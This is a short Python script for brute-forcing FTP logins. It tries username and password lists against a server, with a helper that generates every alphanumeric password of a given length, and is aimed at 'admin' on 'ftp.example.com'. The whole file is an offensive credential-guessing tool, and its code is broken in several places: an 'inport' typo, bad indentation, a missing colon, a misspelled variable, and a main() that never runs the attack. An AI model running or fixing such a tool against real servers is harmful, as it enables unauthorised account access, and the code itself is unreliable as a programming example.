from ftplib inport FTP 
from getpass import getpass
import itertools
import string 

def try_ftp_log(server, username, password):
    try:
        ftp = FTP(server)
            ftp.login(username, password)
            print(f"Success! username: {username}, password: {password}")
            ftp.quit()
            return True 
    except Exception as e:
        print(f"Failed: username: {username}, password {password}")
        return False 

def brute_force_ftp_single_user(server, username, password_list):
    for password in password_list:
        if try_ftp_log(server, username, password):
            return password

    print("Password not found")
    return None 

def brute_force_multy_user(server, username_list, password_list):
    for user in username_list:
        for password in password_list:
            if try_ftp_log(server, user, password):
                return user, password
    print("Password not found")
    return None 

def generate_all_pwd(length):
    if length <= 0:
        raise ValueError("Password length must be greated than 0")

    characters = string.ascii_letters + string.digits

    password_list = []

    for combination in itertools.product(characters, repeat = length):
        password_list.append(''. join(combination))

    return password_list

def main():
    server = 'ftp.example.com'
    username = 'admin'

    with open('passwords.txt', 'r') as file:
        password_lost = file.readlines()

    with open('users.txt', 'r') as file:
        username_list = file.readlines()


if __name__ == "__main__"
    main()
